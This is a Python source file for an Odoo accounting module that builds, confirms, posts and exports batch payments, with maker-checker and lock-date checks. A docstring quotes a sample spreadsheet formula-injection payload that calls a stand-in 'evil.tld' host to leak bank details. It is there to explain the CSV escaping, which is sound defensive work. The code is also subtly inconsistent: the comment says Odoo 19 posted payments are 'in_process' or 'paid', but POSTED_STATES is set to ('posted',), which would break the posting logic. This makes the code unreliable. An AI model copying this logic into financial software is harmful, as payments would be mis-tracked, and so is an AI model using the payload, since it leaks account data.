# -*- encoding: utf-8 -*-
##############################################################################
#
# ERP Heritage
# Copyright (C) 2026 (https://www.erpheritage.com.au/)
#
##############################################################################
"""
eh.batch.payment: header for a batch of customer receipts or vendor payments.

A batch is the operational unit accountants think in: "today I'm paying
the seven vendor bills due this week, all from the AP bank account".
Instead of posting seven payments one by one, a manager builds the
batch once, reviews the totals, and posts the whole batch in a single
transaction. The underlying payments remain standard account.payment
records so every downstream Odoo flow (bank reconciliation, vendor
ledger, follow-up) sees them exactly as if they had been entered
individually.

State machine:

    draft -> confirmed -> posted -> reconciled
                       \\-> cancelled
              \\-> cancelled

The 'reconciled' state is informational; it flips to True once every
payment in the batch is fully reconciled against its source invoice.

Per-payment isolation: posting iterates the batch's payments and
wraps each action_post() in a savepoint. A single broken payment
surfaces an error on the batch but the rest of the batch still posts.
This keeps a 50-payment batch resilient to one bad partner record.
"""

import base64
import csv
import io
import logging

from odoo import _, api, fields, models
from odoo.exceptions import UserError

_logger = logging.getLogger(__name__)

# account.payment in Odoo 19 has no 'posted' state: a successfully posted
# payment lands in 'in_process' (or 'paid' once the bank move reconciles).
# These are the states that mean "the payment moved cash".
POSTED_STATES = ('posted',)

# Leading characters Excel/LibreOffice treat as the start of a formula. A
# leading tab or carriage return is also honoured, so guard those too.
_CSV_INJECTION_LEADERS = ('=', '+', '-', '@', '\t', '\r', '\n')


def _safe_csv_cell(value):
    """Neutralise spreadsheet formula injection in a CSV cell.

    Partner names, payment memos and bank references are free-form and
    typically authored by lower-trust actors (vendor-create clerks,
    inbound supplier-invoice fields) than the manager who exports the
    batch. Excel and LibreOffice auto-execute a cell whose text begins
    with '=', '+', '-' or '@' (or a leading tab/CR) as a formula, so a
    partner named =HYPERLINK("http://evil.tld/x?d="&C2,"ok") would beacon
    the row's IBAN and amount on open. Prefix any such string with an
    apostrophe so the cell renders as literal text. Mirrors
    eh_account_base/tools/xlsx_writer.py::_safe_cell_text for the CSV
    path. Non-string values are returned unchanged.
    """
    if isinstance(value, str) and value[:1] in _CSV_INJECTION_LEADERS:
        return "'" + value
    return value


class EhBatchPayment(models.Model):
    _name = 'eh.batch.payment'
    _description = "Batch payment"
    _inherit = ['mail.thread', 'mail.activity.mixin']
    _order = 'payment_date desc, id desc'
    _rec_name = 'name'

    name = fields.Char(
        required=True, copy=False, default='/', tracking=True,
        help=(
            "Batch reference. Auto-generated from a sequence at create "
            "time when left as the default '/'. Manual entry is allowed "
            "for backfills from a legacy system."
        ),
    )
    state = fields.Selection(
        [
            ('draft', "Draft"),
            ('confirmed', "Confirmed"),
            ('posted', "Posted"),
            ('cancelled', "Cancelled"),
        ],
        default='draft', required=True, tracking=True, index=True,
        help=(
            "draft: still building the batch, members can be added or "
            "removed. confirmed: locked from member edits, ready to "
            "post. posted: every member payment has been posted; cash "
            "has moved. cancelled: terminal, members released back to "
            "the open pool."
        ),
    )
    batch_type = fields.Selection(
        [
            ('inbound', "Inbound (customer receipts)"),
            ('outbound', "Outbound (vendor payments)"),
        ],
        required=True, default='outbound', tracking=True,
        help=(
            "Direction of the batch. Inbound batches group customer "
            "receipts (debits to bank); outbound batches group vendor "
            "payments (credits from bank). The wizard filters add-able "
            "moves accordingly."
        ),
    )
    journal_id = fields.Many2one(
        'account.journal', required=True, tracking=True,
        domain="[('type', 'in', ['bank', 'cash'])]",
        ondelete='restrict',
        help=(
            "Bank or cash journal to debit (inbound) or credit "
            "(outbound). Drives the batch's currency and the SEPA "
            "originator lookup when the SEPA CT module is installed."
        ),
    )
    payment_method_line_id = fields.Many2one(
        'account.payment.method.line',
        string="Payment method",
        domain=(
            "[('journal_id', '=', journal_id),"
            " ('payment_type', '=', "
            "  ('inbound' if batch_type == 'inbound' else 'outbound'))]"
        ),
        help=(
            "Specific payment method on the journal (e.g. SEPA CT, "
            "ACH, manual). Filtered to methods available for the "
            "journal's direction."
        ),
    )
    payment_date = fields.Date(
        required=True, default=fields.Date.context_today, tracking=True,
        help=(
            "Date that will be stamped on every payment in the batch "
            "when posted. Defaults to today; override to schedule a "
            "future-dated batch."
        ),
    )

    company_id = fields.Many2one(
        'res.company', required=True,
        default=lambda self: self.env.company,
        index=True,
        help="Legal entity this batch belongs to.",
    )
    currency_id = fields.Many2one(
        related='journal_id.currency_id',
        store=True, readonly=True,
        help="Currency derived from the bank journal.",
    )

    payment_ids = fields.One2many(
        'account.payment', 'eh_batch_payment_id',
        copy=False,
        help="Member payments belonging to this batch.",
    )

    payment_count = fields.Integer(
        compute='_compute_totals', store=True,
        help="Number of member payments in the batch.",
    )
    total_amount = fields.Monetary(
        compute='_compute_totals', store=True,
        currency_field='currency_id',
        help="Sum of member payment amounts in the batch's currency.",
    )
    posted_count = fields.Integer(
        compute='_compute_totals', store=True,
        help=(
            "Number of member payments already posted. Used by the "
            "form to surface partial posting after a per-payment "
            "savepoint failure."
        ),
    )
    reconciled_count = fields.Integer(
        compute='_compute_totals', store=True,
        help=(
            "Number of posted member payments that have been fully "
            "reconciled against bank statement lines."
        ),
    )
    is_fully_reconciled = fields.Boolean(
        compute='_compute_totals', store=True,
        help=(
            "True when every member payment is fully reconciled. "
            "Closes the loop for period-end reporting."
        ),
    )

    notes = fields.Html(
        help="Free-form notes attached to the batch (audit context).",
    )

    # ---- export (manager-only bank details) ----
    export_file = fields.Binary(
        string="Bank export file",
        attachment=True,
        copy=False,
        groups='eh_account_base.group_eh_manager',
        help=(
            "CSV export of the batch containing partner bank account "
            "numbers. Stored as a field attachment restricted to EH "
            "Accounting Managers, so the file served at /web/content is "
            "not readable by ordinary accounting users."
        ),
    )
    export_filename = fields.Char(
        string="Bank export filename",
        copy=False,
        groups='eh_account_base.group_eh_manager',
        help="Filename used when downloading the bank export.",
    )

    # ---- audit ----
    confirmed_at = fields.Datetime(
        readonly=True, tracking=True,
        help="Timestamp at which the batch was confirmed (locked from edits).",
    )
    confirmed_by_id = fields.Many2one(
        'res.users', readonly=True,
        help="User who confirmed the batch.",
    )
    posted_at = fields.Datetime(
        readonly=True, tracking=True,
        help="Timestamp at which the batch's payments were posted.",
    )
    posted_by_id = fields.Many2one(
        'res.users', readonly=True,
        help="User who posted the batch.",
    )
    cancelled_at = fields.Datetime(
        readonly=True, tracking=True,
        help="Timestamp at which the batch was cancelled.",
    )
    cancelled_by_id = fields.Many2one(
        'res.users', readonly=True,
        help="User who cancelled the batch.",
    )

    @api.depends(
        'payment_ids', 'payment_ids.amount', 'payment_ids.state',
        'payment_ids.is_reconciled',
    )
    def _compute_totals(self):
        for batch in self:
            payments = batch.payment_ids
            batch.payment_count = len(payments)
            batch.total_amount = sum(payments.mapped('amount'))
            posted = payments.filtered(lambda p: p.state in POSTED_STATES)
            batch.posted_count = len(posted)
            reconciled = payments.filtered(lambda p: p.is_reconciled)
            batch.reconciled_count = len(reconciled)
            batch.is_fully_reconciled = (
                batch.payment_count > 0
                and batch.reconciled_count == batch.payment_count
            )

    # ---- onchange (live form feedback) ----

    @api.onchange('journal_id')
    def _onchange_journal_id(self):
        """Drop payments whose journal no longer matches.

        Without this, swapping the journal on a draft batch leaves
        existing payments attached but invisible to validators (their
        journal differs from the batch's journal). Better to clear
        the list visibly so the user re-picks payments under the new
        journal. Same applies to payment_method_line_id which is
        journal-scoped.
        """
        for batch in self:
            if not batch.payment_ids:
                continue
            stale = batch.payment_ids.filtered(
                lambda p: p.journal_id != batch.journal_id,
            )
            if stale:
                batch.payment_ids = [(3, p.id) for p in stale]
                return {
                    'warning': {
                        'title': "Payments removed",
                        'message': (
                            "%d payment(s) were removed from the "
                            "batch because their journal no longer "
                            "matches the batch's journal." % len(stale)
                        ),
                    },
                }

    @api.onchange('batch_type')
    def _onchange_batch_type(self):
        """Refresh the journal domain hint when type flips.

        Inbound batches (customer receipts) usually post to a single
        bank journal; outbound (vendor pay) often uses a dedicated
        AP-disbursement journal. We don't change the journal - just
        emit a warning when the current journal looks like a poor
        fit for the new direction so the user reviews.
        """
        for batch in self:
            if not (batch.journal_id and batch.batch_type):
                continue
            jt = batch.journal_id.type
            if jt not in ('bank', 'cash'):
                return {
                    'warning': {
                        'title': "Journal type mismatch",
                        'message': (
                            "Journal %s is not a bank/cash journal "
                            "and won't accept batch payments." %
                            batch.journal_id.display_name
                        ),
                    }
                }

    # ---- create ----

    @api.model_create_multi
    def create(self, vals_list):
        for vals in vals_list:
            if vals.get('name', '/') == '/':
                seq = self.env['ir.sequence'].next_by_code(
                    'eh.batch.payment',
                ) or '/'
                vals['name'] = seq
        return super().create(vals_list)

    # ---- transitions ----

    def action_confirm(self):
        for batch in self:
            if not self.env.user.has_group(
                'eh_account_base.group_eh_manager',
            ):
                raise UserError(_(
                    "Only an EH Accounting Manager can confirm batch "
                    "payments.",
                ))
            if batch.state != 'draft':
                raise UserError(_(
                    "Only draft batches can be confirmed.",
                ))
            if not batch.payment_ids:
                raise UserError(_(
                    "Cannot confirm an empty batch. Add payments first.",
                ))
            batch.write({
                'state': 'confirmed',
                'confirmed_at': fields.Datetime.now(),
                'confirmed_by_id': self.env.user.id,
            })
        return True

    def action_post(self):
        for batch in self:
            if not self.env.user.has_group(
                'eh_account_base.group_eh_manager',
            ):
                raise UserError(_(
                    "Only an EH Accounting Manager can post batch payments.",
                ))
            if batch.state != 'confirmed':
                raise UserError(_(
                    "Batch must be confirmed before it can be posted. "
                    "Confirm the batch first so the maker-checker "
                    "separation is respected.",
                ))
            if batch.confirmed_by_id and batch.confirmed_by_id == self.env.user:
                raise UserError(_(
                    "Maker-checker separation: the manager who confirmed "
                    "this batch cannot also post it. A different EH "
                    "Accounting Manager must post the batch.",
                ))
            if not batch.payment_ids:
                raise UserError(_(
                    "Cannot post an empty batch.",
                ))
            batch._check_period_lock_date()
            to_post = batch.payment_ids.filtered(
                lambda p: p.state == 'draft',
            )
            failed = batch._post_payments()
            posted_now = to_post.filtered(lambda p: p.state in POSTED_STATES)
            # Reconcile each freshly-posted payment against the documents it
            # settles, so the source invoices/bills actually move to paid
            # instead of leaving the payment and the invoices both open.
            posted_now._eh_reconcile_sources()
            if to_post and not posted_now:
                # Every payment that could be posted failed. Do NOT move
                # the batch to posted: a posted batch with zero movements
                # cannot be cancelled or reset, so it would be stuck
                # forever. Leave the batch in its current state so the user
                # can fix the errors above and post again.
                batch.message_post(body=_(
                    "No payment could be posted; all %d attempt(s) failed. "
                    "The batch stays in its current state. Fix the errors "
                    "above and post again.",
                    len(failed),
                ))
                continue
            if failed:
                # Partial success: the batch posts; the failed payments are
                # listed on chatter for manual follow-up.
                batch.message_post(body=_(
                    "Batch posted with %d failure(s). Review chatter "
                    "for details and post the affected payments "
                    "manually after fixing the underlying issue.",
                    len(failed),
                ))
            batch.write({
                'state': 'posted',
                'posted_at': fields.Datetime.now(),
                'posted_by_id': self.env.user.id,
            })
        return True

    def action_cancel(self):
        for batch in self:
            if not self.env.user.has_group(
                'eh_account_base.group_eh_manager',
            ):
                raise UserError(_(
                    "Only an EH Accounting Manager can cancel batch payments.",
                ))
            if batch.state == 'posted':
                raise UserError(_(
                    "Posted batches cannot be cancelled. Reverse the "
                    "underlying payments instead.",
                ))
            batch.write({
                'state': 'cancelled',
                'cancelled_at': fields.Datetime.now(),
                'cancelled_by_id': self.env.user.id,
            })
        return True

    def action_set_to_draft(self):
        for batch in self:
            is_stuck_empty_posted = (
                batch.state == 'posted'
                and not batch.payment_ids.filtered(
                    lambda p: p.state in POSTED_STATES,
                )
            )
            if batch.state != 'cancelled' and not is_stuck_empty_posted:
                raise UserError(_(
                    "Only cancelled batches, or a posted batch with no "
                    "posted payments, can return to draft.",
                ))
            batch.write({
                'state': 'draft',
                'cancelled_at': False,
                'cancelled_by_id': False,
            })
        return True

    def action_open_build_wizard(self):
        self.ensure_one()
        return {
            'type': 'ir.actions.act_window',
            'name': _("Add payments to batch"),
            'res_model': 'eh.batch.payment.build.wizard',
            'view_mode': 'form',
            'views': [(False, 'form')],
            'target': 'new',
            'context': {'default_batch_id': self.id},
        }

    def action_view_payments(self):
        self.ensure_one()
        return {
            'type': 'ir.actions.act_window',
            'name': _("Payments in batch %s") % self.name,
            'res_model': 'account.payment',
            'view_mode': 'list,form',
            'views': [(False, 'list'), (False, 'form')],
            'domain': [('eh_batch_payment_id', '=', self.id)],
            'context': {'default_eh_batch_payment_id': self.id},
        }

    # ---- lock-date guard ----

    def _period_lock_date(self):
        """Return the effective accounting lock date for this batch's
        company, or None when no lock is set or the field is absent.

        The relevant field is company.fiscalyear_lock_date across Odoo
        16-19; period_lock_date (soft, advisory) is only enforced for
        non-managers so it is deliberately not consulted here. The
        field name is guarded with `in Company._fields` so the module
        stays importable on a build where the field has been renamed.
        """
        self.ensure_one()
        company = self.company_id or self.env.company
        Company = self.env['res.company']
        # Respect BOTH the fiscal-year lock and the hard lock (Odoo 17.4+):
        # the hard lock is an irreversible close, so a batch dated on or
        # before it must be refused just like the fiscal-year lock. Field
        # presence is guarded so the module stays importable on any series.
        candidates = []
        for fname in ('fiscalyear_lock_date', 'hard_lock_date'):
            if fname in Company._fields:
                val = company.sudo()[fname]
                if val:
                    candidates.append(val)
        return max(candidates) if candidates else None

    def _check_period_lock_date(self):
        """Refuse to post a batch dated on or before the company's fiscal
        lock date.

        Every member payment is stamped with the batch's payment_date at
        build time, so a batch dated into a locked period would book its
        journal entries into a closed period. The standard account.move
        lock-date check would raise per payment, but the batch swallows
        per-payment failures into chatter via savepoints, so a locked
        period silently strands the whole batch instead of giving the
        manager one clear message. Guard here, up front, before any
        payment is touched.

        Opt-in-safe: only blocks when a lock date is genuinely set.
        With no lock date configured, prior behaviour is preserved.
        """
        self.ensure_one()
        lock_date = self._period_lock_date()
        if not lock_date:
            return
        # The authoritative booking dates are the member payments' own dates,
        # which can diverge from the batch header date. Block if ANY member
        # payment (or the header date when there are no members yet) would
        # book on or before the lock date.
        member_dates = self.payment_ids.filtered('date').mapped('date')
        candidate_dates = member_dates or [
            self.payment_date or fields.Date.context_today(self)]
        locked = [d for d in candidate_dates if d <= lock_date]
        if locked:
            raise UserError(_(
                "Cannot post this batch: a payment dated %(date)s falls on "
                "or before the accounting lock date %(lock)s. Change the "
                "payment date to a period that is still open, or ask an "
                "administrator to move the lock date.",
                date=fields.Date.to_string(min(locked)),
                lock=fields.Date.to_string(lock_date),
            ))

    # ---- posting helper ----

    def _post_payments(self):
        """Post every payment in the batch, isolating per-payment
        failures via savepoints. Returns the list of payments that
        failed so the caller can surface a summary.
        """
        self.ensure_one()
        failed = []
        for payment in self.payment_ids.filtered(
            lambda p: p.state == 'draft',
        ):
            try:
                with self.env.cr.savepoint():
                    payment.action_post()
            except Exception as exc:  # noqa: BLE001
                failed.append((payment, str(exc)))
                self.message_post(body=_(
                    "Payment %(name)s failed to post: %(err)s",
                    name=payment.display_name,
                    err=str(exc),
                ))
        return failed

    # ---- export ----

    def action_export_csv(self):
        """Export the batch contents to a CSV attachment.

        The payload mirrors the wire format common SMB bank portals
        accept: a row per payment with the partner name, the partner
        bank account if known, the amount, the currency, and the
        reference. Banks that need a different layout subclass and
        override _export_csv_rows.
        """
        self.ensure_one()
        if not self.env.user.has_group(
            'eh_account_base.group_eh_manager',
        ):
            raise UserError(_(
                "Only an EH Accounting Manager can export batch payment "
                "bank details.",
            ))
        rows = self._export_csv_rows()
        buf = io.StringIO()
        writer = csv.writer(buf)
        writer.writerows(rows)
        content = buf.getvalue().encode('utf-8')
        filename = "%s.csv" % self.name
        # Write the payload into a manager-only Binary field. Because the
        # field carries groups='eh_account_base.group_eh_manager' and is an
        # attachment field, Odoo stores it as an ir.attachment bound via
        # res_field. The /web/content field route then enforces field-level
        # access, so the file is NOT served to ordinary accounting users or
        # the public, unlike a plain res_model/res_id attachment.
        self.write({
            'export_file': base64.b64encode(content),
            'export_filename': filename,
        })
        return {
            'type': 'ir.actions.act_url',
            'url': '/web/content/%s/%s/export_file?download=true&filename=%s' % (
                self._name, self.id, filename,
            ),
            'target': 'download',
        }

    def _export_csv_rows(self):
        self.ensure_one()
        rows = [
            ['Reference', 'Partner', 'Bank account', 'Amount',
             'Currency', 'Payment date', 'Memo'],
        ]
        for payment in self.payment_ids.sorted('partner_id'):
            partner = payment.partner_id
            bank = (
                payment.partner_bank_id.acc_number
                if payment.partner_bank_id
                else ''
            )
            # Free-form, lower-trust text columns are neutralised against
            # spreadsheet formula injection. The amount ("%.2f") and the
            # ISO date are machine-formatted and must stay parseable, so
            # they are written raw.
            rows.append([
                _safe_csv_cell(payment.name or ''),
                _safe_csv_cell(partner.display_name if partner else ''),
                _safe_csv_cell(bank or ''),
                "%.2f" % (payment.amount or 0.0),
                _safe_csv_cell(
                    payment.currency_id.name if payment.currency_id else '',
                ),
                payment.date.isoformat() if payment.date else '',
                _safe_csv_cell(payment.ref or ''),
            ])
        return rows
